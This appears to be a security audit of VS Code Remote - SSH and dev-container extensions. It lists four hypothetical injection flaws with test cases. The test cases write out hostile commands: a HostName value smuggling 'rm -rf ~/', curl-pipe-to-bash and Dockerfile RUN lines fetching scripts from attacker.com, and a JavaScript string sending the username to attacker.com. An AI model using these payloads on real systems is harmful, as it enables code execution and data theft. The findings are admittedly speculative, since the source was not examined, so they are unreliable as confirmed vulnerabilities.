# Combined Vulnerabilities in VS Code Remote Development Extensions

## Command Injection via SSH Configuration Parameters

### Description
When a user connects to a repository that contains SSH configuration files, the Remote - SSH extension may process these configuration files to establish connections. If the extension fails to properly sanitize or validate the parameters in these configuration files before using them to construct SSH commands, an attacker could inject malicious commands.

For example, if the extension passes hostname values directly to shell commands without sanitization, an attacker could craft a malicious SSH config file with command injection payloads like:
```
Host exploit
    HostName legitimate-server.com; rm -rf ~/ #
    User root
```

### Impact
An attacker could execute arbitrary commands on a victim's local machine with the privileges of the VS Code process. This could lead to data theft, installation of malware, or further system compromise.

### Vulnerability Rank
High

### Currently Implemented Mitigations
No visible mitigations in the provided project files. The actual implementation of parameter sanitization would be in the extension source code, which isn't included in the provided files.

### Missing Mitigations
- Proper validation and sanitization of all SSH configuration parameters
- Use of parameterized command execution instead of string concatenation
- Restriction of allowed characters in SSH configuration values
- Warning users before using SSH configurations from untrusted repositories

### Preconditions
- Victim must open a malicious repository in VS Code
- Victim must attempt to connect to an SSH target defined in that repository
- The extension must process SSH configuration without proper sanitization

### Source Code Analysis
Without access to the extension source code, a complete analysis isn't possible. However, based on the testing configurations in the project files (such as `/code/ssh/baseline-configs/`), the extension is designed to process SSH configurations and establish connections. 

The vulnerability would exist if the implementation constructs shell commands using string concatenation with unsanitized user input, such as:
```javascript
// Vulnerable example (hypothetical)
const sshCommand = `ssh ${config.hostname} -p ${config.port}`;
executeCommand(sshCommand);
```

### Security Test Case
1. Create a malicious repository containing a `.ssh/config` file with a payload like:
   ```
   Host malicious
       HostName localhost; touch /tmp/pwned #
       User root
       Port 22
   ```
2. Share this repository with the victim
3. When the victim opens the repository and attempts to connect to the "malicious" host using the Remote - SSH extension
4. Check if `/tmp/pwned` file was created, indicating successful command injection

## Remote Code Execution via Post-Connection Scripts

### Description
The Remote - SSH extension may execute setup scripts or commands after establishing a connection to a remote environment. If these scripts or commands are defined in repository configuration files and are executed without proper validation, an attacker could craft a malicious repository that executes arbitrary code.

### Impact
An attacker could execute arbitrary code on the victim's machine with the privileges of the VS Code process, potentially leading to complete system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
No visible mitigations in the provided project files. The actual implementation would be in the extension source code.

### Missing Mitigations
- Validation of all post-connection scripts and commands
- Sandboxing of executed code
- User confirmation before executing any scripts from repository configuration
- Clear warnings about the risks of connecting to repositories from untrusted sources

### Preconditions
- Victim must open a malicious repository in VS Code
- Victim must connect to a remote environment using the Remote - SSH extension
- The extension must execute post-connection scripts or commands defined in the repository without proper validation

### Source Code Analysis
Without access to the extension source code, a complete analysis isn't possible. The vulnerability would exist if the extension implements functionality that executes commands or scripts defined in repository configuration after establishing a connection.

A vulnerable implementation might look like:
```javascript
// Vulnerable example (hypothetical)
function onConnectionEstablished(connection) {
    const postConnectCommands = getConfigurationValue('remote.SSH.postConnectCommands');
    if (postConnectCommands) {
        postConnectCommands.forEach(command => {
            executeCommand(command); // Executes without validation
        });
    }
}
```

### Security Test Case
1. Create a malicious repository with a configuration file (e.g., `.vscode/settings.json`) containing:
   ```json
   {
       "remote.SSH.postConnectCommands": [
           "curl -s http://attacker.com/payload.sh | bash"
       ]
   }
   ```
2. Share this repository with the victim
3. When the victim opens the repository and connects to any remote environment using the Remote - SSH extension
4. The malicious command would be executed, downloading and running the attacker's payload

## Code Injection via Extension Configuration Files

### Description
If the Remote - SSH extension supports custom extension points or configuration options that are evaluated as code, an attacker could craft a malicious repository with configuration files that exploit this functionality to inject and execute malicious code.

### Impact
An attacker could execute arbitrary code within the VS Code extension host process, potentially leading to privilege escalation, data theft, or further exploitation.

### Vulnerability Rank
High

### Currently Implemented Mitigations
No visible mitigations in the provided project files. The actual implementation would be in the extension source code.

### Missing Mitigations
- Strict validation of all configuration values
- Avoiding the use of dynamic code evaluation for configuration values
- Sandboxing any extension points that execute user-provided code
- Clear documentation of security implications for configurable extension points

### Preconditions
- Victim must open a malicious repository in VS Code
- The extension must support configuration options that are evaluated as code
- These configuration options must be read from repository settings without proper validation

### Source Code Analysis
Without access to the extension source code, a complete analysis isn't possible. The vulnerability would exist if the extension implements functionality that evaluates configuration values as code, such as:

```javascript
// Vulnerable example (hypothetical)
function loadCustomHandler(config) {
    const handlerCode = getConfigurationValue('remote.SSH.customConnectionHandler');
    if (handlerCode) {
        const customHandler = new Function(handlerCode); // Dangerous!
        return customHandler;
    }
    return defaultHandler;
}
```

### Security Test Case
1. Create a malicious repository with a configuration file containing code to be evaluated:
   ```json
   {
       "remote.SSH.customHandler": "return function() { require('child_process').exec('curl http://attacker.com/?data='+require('os').userInfo().username); }"
   }
   ```
2. Share this repository with the victim
3. When the victim opens the repository using VS Code with the Remote - SSH extension
4. If the vulnerability exists, the malicious code would be evaluated, executing the attacker's command

## Malicious Dockerfile Injection Leading to Remote Code Execution (RCE)

### Description
The VS Code Remote Development extension automatically builds and deploys development containers from configuration files (such as the Dockerfiles in `/code/ssh/baseline-configs/fedora/Dockerfile` and `/code/ssh/baseline-configs/fedora+/Dockerfile`).

A threat actor can supply a manipulated repository that includes a modified Dockerfile containing an injected malicious instruction. For example, an attacker may insert an extra `RUN` command that downloads and executes a payload:
  
```
RUN curl -o /tmp/malicious.sh http://attacker.com/malicious.sh && sh /tmp/malicious.sh
```
  
When the victim opens the repository with the Remote Development extension, the extension triggers a container build. Since no validation is performed on the contents of the Dockerfile, the injected command is executed during the build process.

Step by step:
1. The attacker modifies the Dockerfile in the repository to append a malicious command.
2. The victim downloads/opens this repository in VS Code.
3. The extension automatically detects and builds the container from the Dockerfile.
4. The malicious command is executed on the victim's system (or within the container environment), resulting in remote code execution.

### Impact
- Successful exploitation can result in arbitrary command execution within the Docker container.
- If the victim's Docker configuration or privileges are not sufficiently restricted, the attacker may further escalate privileges or pivot from the compromised container to other resources.
- This can lead to compromise of the host system, leakage of sensitive data, or further lateral movement within the network.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- There is a comment in the Fedora Dockerfile regarding exposure on an isolated Docker network ("# TODO: expose only on an isolated docker network to avoid conflicts?"); however, this is only a note and no real mitigation is implemented.
- No validation, sanitization, or integrity checking of Dockerfile content is observed in the provided project files.

### Missing Mitigations
- **Dockerfile Content Validation:** Implement strict validation and sanitization of user-supplied Dockerfiles before initiating any build process.
- **User Confirmation:** Require explicit user confirmation or review when a Dockerfile from an external repository is to be used for building a container.
- **Sandboxing and Isolation:** Ensure that container builds run in a highly restricted and isolated environment with minimal privileges, so that any malicious behavior is contained.
- **Integrity Verification:** Introduce code-signing or similar integrity verification measures for trusted configuration files used in dev container builds.

### Preconditions
- The victim opens a repository (e.g., a GitHub repo) with the Remote Development extension.
- The repository provided by the attacker has been manipulated to include a Dockerfile with injected malicious commands.
- The extension automatically triggers the container build process without any additional user validation or confirmation that would detect the manipulated file.

### Source Code Analysis
- **Examination of Dockerfiles:**
  - The file `/code/ssh/baseline-configs/fedora/Dockerfile` starts with a base image (`FROM fedora:latest`) and includes commands such as installing OpenSSH server and modifying configuration files using `sed`. It concludes with exposing a port and running the SSH daemon.
  - Similarly, `/code/ssh/baseline-configs/fedora+/Dockerfile` performs akin operations with minor differences.
  - Both files are used as part of the extension's baseline configurations for automated testing and containerized development.
- **Injection Point:**
  - There is no code that verifies or sanitizes the contents of these Dockerfiles before they are used. Therefore, if an attacker appends a malicious `RUN` command, it becomes part of the build instructions.
  - A malicious command inserted into a manipulated Dockerfile will be executed directly when the container is being built, as Docker processes each `RUN` instruction sequentially.
- **Visualization of the Attack Flow:**
  1. **Repository Intake:** Victim acquires repository.
  2. **Automated Build Trigger:** Extension detects dev container configuration (Dockerfile).
  3. **Execution:** Docker build is executed that processes all RUN commands including the malicious one.
  4. **RCE:** Malicious payload is executed.

### Security Test Case
1. **Setup:**
   - Create a modified version of the repository that includes a Dockerfile in one of the baseline configurations (for example, in `/code/ssh/baseline-configs/fedora/Dockerfile`).
   - Append a malicious command at the end of the Dockerfile:
     
     ```
     RUN curl -o /tmp/malicious.sh http://attacker.com/malicious.sh && sh /tmp/malicious.sh
     ```
     
2. **Execution:**
   - Open the manipulated repository in Visual Studio Code with the Remote Development extension enabled.
   - Trigger the dev container build process using the command indicated in the documentation (for example, `devcontainer up --workspace-folder <PATH_TO_CONFIG>`).
3. **Observation:**
   - Monitor the Docker build logs and container output to detect the execution of the malicious command.
   - Check that the payload (e.g., the downloaded script) is executed by verifying changes in the container environment or by using logging/monitoring mechanisms.
4. **Validation:**
   - Confirm that the malicious script execution occurred, thereby validating that the Dockerfile injection leads to remote code execution.
   - Evaluate the environment for any elevated privileges or access beyond the container's sandbox to further assess the potential host impact.
